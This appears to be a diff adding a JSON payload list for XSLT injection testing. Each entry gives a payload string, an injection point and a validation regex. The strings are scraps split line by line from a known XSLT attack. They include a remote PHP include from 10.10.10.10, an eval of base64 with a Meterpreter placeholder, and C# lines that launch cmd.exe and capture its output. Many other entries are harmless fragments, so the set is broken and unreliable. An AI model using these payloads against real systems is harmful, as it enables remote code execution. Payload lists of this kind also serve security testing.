@@ -1,0 +1,277 @@
+[
+  {
+    "payload_id": "OWP-246137",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Fruits &ext_file;:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246141",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "- <xsl:value-of select=\"name\"/>: <xsl:value-of select=\"description\"/>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246146",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Fruits:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246148",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246149",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "xmlns:exploit=\"http://exslt.org/common\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246153",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Hello World!",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246160",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "include(\"http://10.10.10.10/test.php\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246164",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "eval(base64_decode('Base64-encoded Meterpreter code'))",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246178",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "public string ToShortDateString(string date)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246179",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Windows",
+    "injection_point": "query_parameter",
+    "payload_string": "System.Diagnostics.Process.Start(\"cmd.exe\");",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246180",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "return \"01/01/2001\";",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246181",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "]]>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246193",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "xmlns:msxsl=\"urn:schemas-microsoft-com:xslt\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246194",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "xmlns:user=\"urn:my-scripts\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246196",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "public string execute(){",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246197",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "System.Diagnostics.Process proc = new System.Diagnostics.Process();",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246198",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Windows",
+    "injection_point": "query_parameter",
+    "payload_string": "proc.StartInfo.FileName= \"C:\\\\windows\\\\system32\\\\cmd.exe\";",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246199",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "proc.StartInfo.RedirectStandardOutput = true;",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246200",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "proc.StartInfo.UseShellExecute = false;",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246201",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "proc.StartInfo.Arguments = \"/c dir\";",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246202",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "proc.Start();",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246203",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "proc.WaitForExit();",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246204",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "return proc.StandardOutput.ReadToEnd();",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246205",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "--- BEGIN COMMAND OUTPUT ---",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-246207",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "--- END COMMAND OUTPUT ---",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xslt|xml"
+    }
+  }
+]
